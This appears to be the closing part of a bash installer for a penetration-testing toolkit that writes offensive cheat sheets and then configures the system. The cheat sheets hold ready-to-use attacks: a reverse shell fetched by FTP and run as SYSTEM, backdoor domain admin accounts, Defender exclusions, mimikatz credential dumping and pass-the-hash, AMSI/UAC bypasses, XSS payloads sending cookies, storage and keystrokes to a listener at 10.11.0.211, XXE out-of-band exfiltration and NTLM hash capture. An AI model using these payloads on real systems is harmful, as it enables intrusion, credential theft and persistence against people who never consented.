cd %temp%
--->FileTransfer

// Accesschk stuff
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

// Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

// Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
================================================================================
1. Get and Run wmic_info.bat - read it over.
================================================================================
STUFF DONE IN THE PAST

Did you come in as a NT AUTHORITY\NETWORK SERVICE?
MS09-012.exe "whoami"
Initiate Network-Related Transfer Again.
MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.
================================================================================
[+ Clear Logs]
SYSTEM + RDP = as nt-authority system or administrator --> eventvrw.msc
psexec /accepteula -s cmd.exe /c cmd.exe
================================================================================
[+ IF I AM AN ADMIN ON THE MACHINE AND WANT TO TRY FOR SYSTEM.] (Worked on Win7)
cd /d C:\

mkdir Tools

Note: maint.exe is a regular x86 reverse netcat compatible shell on PORT 443.
echo open 10.11.0.211 21 > ftp.txt
echo USER ftpuser >> ftp.txt
echo superpass>> ftp.txt
echo bin >> ftp.txt
echo GET maint.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt

schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn okay /tr "\"C:\\Tools\\maint.exe\""
nc -lvp 443
schtasks /RUN /TN "okay"
================================================================================
[+ TIME AND AT SCHEDULE TASK ]
================================================================================
C:/> time
The current time is:  6:41:05.81
Enter the new time:

C:/> at 06:42 /interactive "C:\Tools\maint.exe"
================================================================================
================================================================================
OTHER STUFF
================================================================================
[ADDING AN ADMINISTRATOR]
cmd.exe /c net user siren superpass /add
cmd.exe /c net localgroup administrators siren /add
cmd.exe /c net localgroup "Remote Desktop Users" siren /add
[ADDING A DOMAIN ADMINISTRATOR]
# WINDOWS: Add domain user and put them in Domain Admins group
net user siren superpass /ADD /DOMAIN
net localgroup Administrators siren /ADD /DOMAIN
net localgroup "Remote Desktop Users" siren /ADD
net group "Domain Admins" siren /ADD /DOMAIN
net group "Enterprise Admins" siren /ADD /DOMAIN
net group "Schema Admins" siren /ADD /DOMAIN
net group "Group Policy Creator Owners" siren /ADD /DOMAIN

================================================================================
===SHARES
Create a Share.
NET SHARE
NET USE

===CREATE SHARE
NET SHARE <sharename>=<drive/folderpath /remark:"some remark"

===MOUNT SHARE
NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES

===UNMOUNT SHARE
NET USE Z: /DELETE

===DELETE SHARE
NET SHARE <SHARE_NAME> /DELETE
===============================================================================
// Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
// A part of group "Authenticated Users" - you would be surprised if you have a real user.
accesschk.exe -uwqs "Authenticated Users" c:\*.*
===============================================================================

====[Remember PSpy32 & PSpy64? - This is like that - Check for scheduled items / cron jobs]=====
schtasks /query /fo LIST /v

================================================================================
[Dude, this]
use exploit/windows/local/service_permissions.
================================================================================
EXECUTE POWERSHELL PRIVILEGE ESCALATION SCRIPT FOR THE LOVE OF GOD.
powershell.exe 'C:\Tools\privesc.ps1'
================================================================================
#RDP
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
================================================================================
#DUMP GROUP CACHED CREDENTIALS
meterpreter > back
use post/windows/gather/cachedump
================================================================================
#MpPreference
Add-MpPreference -ExclusionPath "C:\windows\tasks"
Add-MpPreference -ExclusionExtension ".exe"
================================================================================
#Dumped Domain Cached Credentials
privilege::debug
token::elevate
lsadump::cache

#Dump Password Hashes (NTLM)
privilege::debug
sekurlsa::logonpasswords

#Dump LSA Secrets
privilege::debug
lsadump::secrets

#Dump Passwords from TermService (RDP)
privilege::debug
sekurlsa::ts


#xdg
privilege::debug
token::elevate
sekurlsa::dpapi
dpapi::blob /in:password.blob /unprotect
================================================================================
# Over Pass-the-hash
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::pth /user:freya /domain:arc.corp /ntlm:5d41402abc4b2a76b9719d911017c592 /run:cmd.exe

#OPTH - With wmiexec
python3 wmiexec.py arc.corp/freya@DCARC.arc.corp -hashes :5d41402abc4b2a76b9719d911017c592

REFEOF

    cat > "$REFERENCE_DST/winrmref" << 'REFEOF'
==EVIL-WINRM - BASIC AUTH=======================================================
evil-winrm -i target-ip -u username -p password
================================================================================

==EVIL-WINRM - DOMAIN AUTH======================================================
evil-winrm -i target-ip -u username -p password -d DOMAIN
================================================================================

==EVIL-WINRM - NTLM HASH (PTH)==================================================
evil-winrm -i target-ip -u username -H NTLMHASH
================================================================================

==EVIL-WINRM - SSL / HTTPS (5986)===============================================
evil-winrm -i target-ip -u username -p password -S
================================================================================

==EVIL-WINRM - EXEC SINGLE COMMAND=============================================
evil-winrm -i target-ip -u username -p password -e "whoami"
================================================================================

==EVIL-WINRM - LOAD LOCAL SCRIPTS==============================================
evil-winrm -i target-ip -u username -p password -s /path/to/scripts
================================================================================

==EVIL-WINRM - UPLOAD FILE=====================================================
evil-winrm -i target-ip -u username -p password -u local.exe -r C:\Temp\local.exe
================================================================================

==EVIL-WINRM - DOWNLOAD FILE===================================================
evil-winrm -i target-ip -u username -p password -r C:\Users\Administrator\Desktop\loot.txt
================================================================================

==EVIL-WINRM - POWERSHELL MODULE IMPORT========================================
evil-winrm -i target-ip -u username -p password -s /usr/share/windows-resources/powersploit
================================================================================

==EVIL-WINRM - AMSI BYPASS=====================================================
evil-winrm -i target-ip -u username -p password --amsi-bypass
================================================================================

==EVIL-WINRM - BYPASS UAC======================================================
evil-winrm -i target-ip -u username -p password --bypass-uac
================================================================================

==EVIL-WINRM - VERBOSE LOGGING=================================================
evil-winrm -i target-ip -u username -p password -v
================================================================================
REFEOF

    cat > "$REFERENCE_DST/wordpressref" << 'REFEOF'
[WPSCAN]
================================================================================
===WPScan & SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

===WPScan Brute Forceing - FASTER THAN BURP TO FIRST 20,000 REQUESTS:
wpscan --url $URL --disable-tls-checks -U users.txt -P /usr/share/wordlists/rockyou.txt
================================================================================
REFEOF

    cat > "$REFERENCE_DST/xssRef.txt" << 'REFEOF'
==============================================================
In vulnerable field:
"Using injected JavaScript, we can force the victim's browser
to beacon back to us (cookie/session data, page context, etc).
This is commonly used to confirm XSS and, if applicable, steal
session tokens when cookies are not HttpOnly.

Listener:
nc -lvp 81

Cookie exfil (basic):
<script>new Image().src="http://10.11.0.211:81/bogus.php?c="+encodeURIComponent(document.cookie);</script>

Cookie exfil (short):
<img src=x onerror="new Image().src='http://10.11.0.211:81/?c='+encodeURIComponent(document.cookie)">

DOM exfil (page HTML snippet):
<script>new Image().src="http://10.11.0.211:81/?h="+btoa(unescape(encodeURIComponent(document.documentElement.outerHTML.slice(0,2048))));</script>
==============================================================
Example Output:
connect to [10.11.0.211] from siren [10.11.0.211] 52688
GET /bogus.php?c=PHPSESSID%3D9d60bd87c369abd5eff242dec9f7d4b6 HTTP/1.1
==============================================================

==============================================================
===== QUICK CONFIRM (REFLECTED / STORED)
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
==============================================================

==============================================================
===== ATTRIBUTE BREAKOUTS
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
==============================================================

==============================================================
===== HTML CONTEXT PAYLOADS
<textarea autofocus onfocus=alert(1)></textarea>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<details open ontoggle=alert(1)>X</details>
==============================================================

==============================================================
===== JS CONTEXT / STRING BREAKOUTS
');alert(1);// 
");alert(1);// 
</script><script>alert(1)</script>
==============================================================

==============================================================
===== FILTER / WAF EVASION (BASIC VARIANTS)
<img src=x onerror=confirm(1)>
<svg/onload=alert(1)>
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#40;1&#41;>
==============================================================

==============================================================
===== LOAD EXTERNAL JS (BEEFIER THAN INLINE)
<script src="http://10.11.0.211:81/xss.js"></script>
<img src=x onerror="s=document.createElement('script');s.src='http://10.11.0.211:81/xss.js';document.head.appendChild(s)">
<svg onload="s=document.createElement('script');s.src='http://10.11.0.211:81/xss.js';document.head.appendChild(s)"></svg>
==============================================================

==============================================================
===== FETCH BEACON (GET) - RELIABLE LOGGING
<script>fetch("http://10.11.0.211:81/x?u="+encodeURIComponent(location.href)+"&o="+encodeURIComponent(document.origin));</script>
<img src=x onerror="fetch('http://10.11.0.211:81/x?u='+encodeURIComponent(location.href))">
==============================================================

==============================================================
===== LOCAL STORAGE / SESSION STORAGE GRABS (IF RELEVANT)
<script>new Image().src="http://10.11.0.211:81/?ls="+encodeURIComponent(JSON.stringify(localStorage));</script>
<script>new Image().src="http://10.11.0.211:81/?ss="+encodeURIComponent(JSON.stringify(sessionStorage));</script>
==============================================================

==============================================================
===== KEYLOGGER (SIMPLE)
<script>document.addEventListener('keydown',e=>fetch("http://10.11.0.211:81/k?key="+encodeURIComponent(e.key)));</script>
==============================================================

==============================================================
===== ANGULARJS SANDBOX ESCAPES (APP-DEP, LEGACY)
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
{{$on.constructor("var s=document.createElement('script');s.src='http://ATTACKER-DOMAIN.COM/x.js';document.head.appendChild(s);")()}}
==============================================================

==============================================================
===== SMALL / TINY CONFIRM
<img src=x onerror=prompt(1)>
<svg onload=prompt(1)>
==============================================================
REFEOF

    cat > "$REFERENCE_DST/xxeref" << 'REFEOF'
PAYLOAD ALL THE THINGS
==XML XXE - QUICK REFERENCE=====================================================
Goal : Identify XML External Entity processing (in-band + blind/OOB) and impact
Note : Replace /etc/passwd with a safe test file where appropriate; replace OOB
       URL with your controlled listener domain (e.g., collaborator-style).
================================================================================

==XXE - BASIC DETECTION (ENTITY EXPANSION)======================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY xxe "XXE_TEST"> ]><root>&xxe;</root>
================================================================================

==XXE - FILE READ (GENERIC)=====================================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>
================================================================================

==XXE - WINDOWS FILE READ=======================================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]><root>&xxe;</root>
================================================================================

==XXE - SSRF VIA SYSTEM IDENTIFIER==============================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "http://127.0.0.1:80/"> ]><root>&xxe;</root>
================================================================================

==XXE - BLIND OOB (PARAMETER ENTITY)============================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY % ext SYSTEM "http://ATTACKER-DOMAIN/xxe.dtd"> %ext; ]><root>ok</root>
================================================================================

==XXE - OOB DTD (SIMPLE PINGBACK)===============================================
<!ENTITY % ping SYSTEM "http://ATTACKER-DOMAIN/ping"> %ping;
================================================================================

==XXE - OOB EXFIL (DTD USING PHP FILTER, IF APPLICABLE)=========================
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER-DOMAIN/?d=%file;'>">%all;
================================================================================

==XXE - IN-BAND EXFIL (WHEN RESPONSE REFLECTS ENTITY)===========================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><root><v>&xxe;</v></root>
================================================================================

==XXE - SOAP BODY (DROP-IN EXAMPLE)============================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><req>&xxe;</req></soap:Body></soap:Envelope>
================================================================================

==XXE - SVG UPLOAD TEST (XML-BASED)=============================================
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><text x="1" y="9">&xxe;</text></svg>
================================================================================

==XXE - COMMON FAILURE INDICATORS===============================================
DOCTYPE blocked | Entity not defined | External entity disabled | No outbound DNS/HTTP | Parser strips DTD
================================================================================

[POST DATA]
auth=PAYLOAD

VALUE=one of these per-line.
<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26t>

<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20test%20SYSTEM%20%27file%3A%2F%2

<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250Als' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
SYSTEM "php://filter/convert.base64-encode/resource="
================================================================================
[XXE TO REMOTE CODE EXECUTION]

#Discovery
<?xml version = "1.0"?><!DOCTYPE foo [<!ENTITY steal SYSTEM "file:///c:/windows/win.ini"> ]>

#Then:
<?xml version = "1.0"?><!DOCTYPE foo [<!ENTITY steal SYSTEM "file://///10.10.14.12/smb/hash.jpg"> ]>
<person>
<lastname>offsec
	&steal;
</lastname>
</person>

RCE with NTLM:
* responder -I tun0 -v
* python3 /usr/share/evil-ssdp/evil_ssdp.py tun0
* URL = file://///10.10.14.12/smb/hash.jpg
* <?xml version = "1.0"?><!DOCTYPE foo [<!ENTITY steal SYSTEM "file://///10.10.14.12/smb/hash.jpg"> ]>

Retrieve:
[SMB] NTLMv2-SSP Client   : ::ffff:[REDACTED]
[SMB] NTLMv2-SSP Username : [REDACTED-PC]\[REDACTED-USER]
[SMB] NTLMv2-SSP Hash     : [REDACTED-USER]::WIN-OVT7SS2O6HR:ffda536eebddd9ff:56608E6BB63B9EF8075E75E6FCFEAD13:010100000000000080070B0B4462D8014105F8012A7C88C700000000020008004B0049003000490001001E00570049004E002D0046004E0056005800580034005800530047004900470004003400570049004E002D0046004E005600580058003400580053004700490047002E004B004900300049002E004C004F00430041004C00030014004B004900300049002E004C004F00430041004C00050014004B004900300049002E004C004F00430041004C000700080080070B0B4462D8010600040002000000080030003000000000000000000000000030000074C73B2884C3F6C9B391C1BFDD689CBD8363A424E57A276415102C0CDA855CE20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000

Everything after "Hash" into a file.
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
================================================================================
REFEOF

    cat > "$REFERENCE_DST/zipref" << 'REFEOF'
=======================================================================
 _____  ___    __     ______    _______      ________    __       _______        _______  __    ___       _______       ________  __      ________  ___________  _______   _______           
(\"   \|"  \  |" \   /" _  "\  /"     "|    ("      "\  |" \     |   __ "\      /"     "||" \  |"  |     /"     "|     /"       )|" \    /"       )("     _   ")/"     "| /"      \          
|.\\   \    | ||  | (: ( \___)(: ______)     \___/   :) ||  |    (. |__) :)    (: ______)||  | ||  |    (: ______)    (:   \___/ ||  |  (:   \___/  )__/  \\__/(: ______)|:        |         
|: \.   \\  | |:  |  \/ \      \/    |         /  ___/  |:  |    |:  ____/      \/    |  |:  | |:  |     \/    |       \___  \   |:  |   \___  \       \\_ /    \/    |  |_____/   )         
|.  \    \. | |.  |  //  \ _   // ___)_       //  \__   |.  |    (|  /          // ___)  |.  |  \  |___  // ___)_       __/  \\  |.  |    __/  \\      |.  |    // ___)_  //      /   _____  
|    \    \ | /\  |\(:   _) \ (:      "|     (:   / "\  /\  |\  /|__/ \        (:  (     /\  |\( \_|:  \(:      "|     /" \   :) /\  |\  /" \   :)     \:  |   (:      "||:  __   \  ))_  ") 
 \___|\____\)(__\_|_)\_______) \_______)      \_______)(__\_|_)(_______)        \__/    (__\_|_)\_______)\_______)    (_______/ (__\_|_)(_______/       \__|    \_______)|__|  \___)(_____(  
                                                                                                                                                                                             

zip -r <filename.zip> <path to folder>

unzip <filename.zip>

[CRACKING ZIPS]
zip2john FILE.zip > HASH.txt
john --wordlist=/usr/share/wordlists/rockyou.txt HASH.txt

======================================================================
====ZIP SLIP
zipslip.sh $file

#EvilArc
https://github.com/cesarsotovalero/zip-slip-exploit-example/blob/master/evilarc.py
$ python2.7 -d 16 -o unix someFile         
#Creates an evil.zip file that contains our traversal strings.
$ zip evil.zip ../../../../../../../../../etc/passwd
#Evil performed. 
======================================================================
/bin/zipslip.sh $file
REFEOF

    cat > "$REFERENCE_DST/zoneref" << 'REFEOF'
=================================================================================
ZONE TRANSFER:
A successful zone transfer does not directly result in a network breach.
However, it does facilitate the process. The host command syntax for performing a zone
transfer is as follows.

Syntax:
1. host -t NS <domain>
2. host -l <domain_name_in_question> <domain_name_server_to_check>

Could provide me with a full dump of the ZONE FILE, thus IPs and DNS names as
well, for the given domain.


TOOL CREATED: zoneAnalyze.sh
Usage: zoneAnalyze.sh <domain_target> <type_NS_MX>
    * Example: zoneAnalyze.sh megacorpone.com NS
    * --fi

What it does: Go through a for loop, set variable 'server' to return the
results of an ordinary nslookup/host -t NS lookup result. BUT, for each one,
cut out only the nameservers with |cut -d" " -f4 and that will be the result of
the, now, $server variable.

Inside the loop, check against each result of $server (nameserver returns) and
attempt a simple zone transfer against each one.

Output could possibly be a LOT of information - total dump of that domain's
IPs, domain name servers, mail servers...shit tons of stuff if it succeeds.
=================================================================================
REFEOF

    local file_count
    file_count="$(find "$REFERENCE_DST" -type f | wc -l)"
    log "SUCCESS" "Created $file_count reference files in $REFERENCE_DST"
    return 0
}


################################################################################
# SYSTEM CONFIGURATION
################################################################################

configure_system() {
    log "HEADER" "Configuring system settings..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would configure system settings"
        return 0
    fi

    # Disable screen lock
    local disable_lock
    disable_lock=$(get_config_value "$CONFIG_FILE" "tool_settings.system.disable_screen_lock" "true")

    if [[ "$disable_lock" == "true" ]]; then
        log "STATUS" "Disabling screen lock..."

        local lock_script=""
        for path in "$SCRIPTS_DIR/disable-lock-screen.sh" "$DEPLOY_DIR/installer/scripts/disable-lock-screen.sh"; do
            if [[ -f "$path" ]]; then
                lock_script="$path"
                break
            fi
        done

        if [[ -n "$lock_script" ]]; then
            chmod +x "$lock_script" || true
            run_command "bash $lock_script" "Disabling screen lock" "$SHORT_TIMEOUT" || true
        fi
    fi

    # Configure IPv6
    local disable_ipv6
    disable_ipv6=$(get_config_value "$CONFIG_FILE" "tool_settings.network.disable_ipv6" "false")

    if [[ "$disable_ipv6" == "true" ]]; then
        log "STATUS" "Disabling IPv6..."

        cat > "/etc/sysctl.d/99-disable-ipv6.conf" << 'EOF'
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
EOF

        sysctl -p /etc/sysctl.d/99-disable-ipv6.conf &>/dev/null || {
            log "WARNING" "Failed to apply IPv6 settings"
        }
    fi

    # Create desktop shortcuts
    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        log "STATUS" "Creating desktop shortcuts..."

        mkdir -p "/usr/share/applications" 2>/dev/null || true

        # RTA Validation shortcut
        cat > "/usr/share/applications/rta-validate.desktop" << EOF
[Desktop Entry]
Version=1.0
Name=RTA Tools Validation
Comment=Validate RTA security tools installation
Exec=x-terminal-emulator -e "sudo ${SCRIPTS_DIR}/validate-tools.sh"
Terminal=true
Type=Application
Icon=security-high
Categories=Utility;Security;
EOF

        # RTA Deployment shortcut
        cat > "/usr/share/applications/rta-deploy.desktop" << EOF
[Desktop Entry]
Version=1.0
Name=RTA Deployment
Comment=Re-deploy or update RTA tools
Exec=x-terminal-emulator -e "sudo ${SCRIPT_DIR}/deploy-rta.sh --interactive"
Terminal=true
Type=Application
Icon=system-software-update
Categories=Utility;System;
EOF

        chmod 644 /usr/share/applications/rta-*.desktop 2>/dev/null || true
    fi

    log "SUCCESS" "System configuration completed"
    return 0
}

################################################################################
# SYSTEM SNAPSHOT AND VALIDATION
################################################################################

create_system_snapshot() {
    log "HEADER" "Creating system snapshot..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would create system snapshot"
        return 0
    fi

    mkdir -p "$SYSTEM_STATE_DIR"
    local snapshot_file
    snapshot_file="${SYSTEM_STATE_DIR}/snapshot-$(date +%Y%m%d-%H%M%S).txt"

    {
        echo "=== SYSTEM SNAPSHOT ==="
        echo "Date: $(date)"
        echo "Hostname: $(hostname)"
        echo "Kernel: $(uname -r)"
        echo ""
        echo "=== DISK SPACE ==="
        df -h | head -5
        echo ""
        echo "=== MEMORY ==="
        free -h
        echo ""
        echo "=== INSTALLED PACKAGES (sample) ==="
        dpkg -l | grep "^ii" | wc -l
        echo ""
    } > "$snapshot_file"

    log "SUCCESS" "Snapshot saved to: $snapshot_file"
    return 0
}

################################################################################
# SUMMARY REPORT
################################################################################

create_summary() {
    log "HEADER" "Creating deployment summary..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would create summary report"
        return 0
    fi

    mkdir -p "$LOG_DIR"

    {
        echo "==================================================================="
        echo "                RTA DEPLOYMENT SUMMARY - v${VERSION}"
        echo "==================================================================="
        echo "Date: $(date)"
        echo "Hostname: $(hostname)"
        echo "Kernel: $(uname -r)"
        echo ""
        echo "=== DEPLOYMENT CONFIGURATION ==="
        echo "DRY_RUN: $DRY_RUN"
        echo "FORCE_REINSTALL: $FORCE_REINSTALL"
        echo "VERBOSE: $VERBOSE"
        echo "Auto Mode: $AUTO_MODE"
        echo ""
        echo "=== INSTALLATION DIRECTORIES ==="
        echo "Deploy: $DEPLOY_DIR"
        echo "Tools: $TOOLS_DIR"
        echo "Logs: $LOG_DIR"
        echo "References: $REFERENCE_DST"
        echo ""
        echo "=== NEXT STEPS ==="
        echo "1. Run validation: sudo ${SCRIPTS_DIR}/validate-tools.sh"
        echo "2. Check BloodHound: sudo systemctl start bloodhound-ce"
        echo "3. Review logs: less ${MAIN_LOG}"
        echo ""
        echo "=== IMPORTANT NOTES ==="
        echo "- A system reboot is recommended"
        echo "- Manual tools require separate installation"
        echo "- Reference files are in: ${REFERENCE_DST}"
        echo ""
        echo "==================================================================="
    } >> "$SUMMARY_FILE"

    log "SUCCESS" "Summary saved to: $SUMMARY_FILE"
    return 0
}

################################################################################
# MAIN INSTALLATION FLOW
################################################################################

main() {
    display_banner

    # Verify root access
    require_root

    # Initialize logging
    mkdir -p "$LOG_DIR"
    log "HEADER" "Starting RTA Deployment v${VERSION}"
    log "INFO" "Log file: $MAIN_LOG"
    log "INFO" "DRY_RUN: $DRY_RUN"
    log "INFO" "Mode: $(if $FULL_INSTALL; then echo 'full'; elif $CORE_TOOLS_ONLY; then echo 'core-only'; elif $DESKTOP_ONLY; then echo 'desktop-only'; fi)"
    log "INFO" "Interactive: $INTERACTIVE_MODE | Skip downloads: $SKIP_DOWNLOADS | Reinstall failed: $REINSTALL_FAILED"

    # Step 1: Check dependencies
    check_dependencies || exit 1

    # Step 2: Check system resources
    check_system_resources || true

    # Step 3: Create directories
    create_directories || exit 1

    # Step 4: Setup configuration
    backup_config
    ensure_config || exit 1

    # Step 5: Route by installation mode
    if $DESKTOP_ONLY; then
        log "STATUS" "Desktop-only installation mode"
        if prompt_yes_no "Configure desktop environment"; then
            configure_system || log "WARNING" "Desktop configuration had issues"
        fi
    elif $CORE_TOOLS_ONLY; then
        log "STATUS" "Core tools only installation mode"
        if prompt_yes_no "Install core tools"; then
            local apt_tools
            apt_tools=$(get_config_value "$CONFIG_FILE" "apt_tools" "nmap,wireshark,sqlmap,hydra,metasploit-framework")
            install_apt_packages "$apt_tools" || log "WARNING" "Some APT tools failed"
        fi
    else
        # Full installation
        log "STATUS" "Full installation mode"

        # APT packages
        if prompt_yes_no "Install APT packages"; then
            local apt_tools
            apt_tools=$(get_config_value "$CONFIG_FILE" "apt_tools" "")
            if [[ -n "$apt_tools" ]]; then install_apt_packages "$apt_tools" || true; else log "INFO" "No APT packages configured"; fi
        fi

        # PIPX packages
        if prompt_yes_no "Install PIPX packages"; then
            local pipx_tools
            pipx_tools=$(get_config_value "$CONFIG_FILE" "pipx_tools" "")
            if [[ -n "$pipx_tools" ]]; then install_pipx_packages "$pipx_tools" || true; else log "INFO" "No PIPX packages configured"; fi
        fi

        # Git repositories
        if $SKIP_DOWNLOADS; then
            log "INFO" "Skipping Git repositories (--skip-downloads)"
        elif prompt_yes_no "Clone Git repositories"; then
            local git_tools
            git_tools=$(get_config_value "$CONFIG_FILE" "git_tools" "")
            if [[ -n "$git_tools" ]]; then install_git_repos "$git_tools" || true; else log "INFO" "No Git repositories configured"; fi
        fi

        # TeamViewer policykit-1 fix (must run before manual tool helpers)
        fix_teamviewer_policykit || log "WARNING" "TeamViewer policykit fix had issues"

        # Manual tool installers
        if prompt_yes_no "Install manual tools"; then
            local manual_tools
            manual_tools=$(get_config_value "$CONFIG_FILE" "manual_tools" "")
            if [[ -n "$manual_tools" ]]; then install_manual_tools "$manual_tools" || true; else log "INFO" "No manual tools configured"; fi
        fi

        # BloodHound CE
        if prompt_yes_no "Install BloodHound CE"; then
            install_bloodhound_ce || log "WARNING" "BloodHound installation had issues"
        fi

        # Reference cheatsheets (embedded in script — no external files needed)
        if prompt_yes_no "Create reference cheatsheets"; then
            create_reference_files || log "WARNING" "Reference file creation had issues"
        fi

        # System configuration
        if prompt_yes_no "Configure system settings"; then
            configure_system || log "WARNING" "System configuration had issues"
        fi

        # System snapshot
        create_system_snapshot || log "WARNING" "Failed to create system snapshot"
    fi

    log "HEADER" "RTA Deployment completed successfully!"
    return 0
}

################################################################################
# ENTRY POINT
################################################################################

# Parse arguments
parse_arguments "$@"

# Run main
main
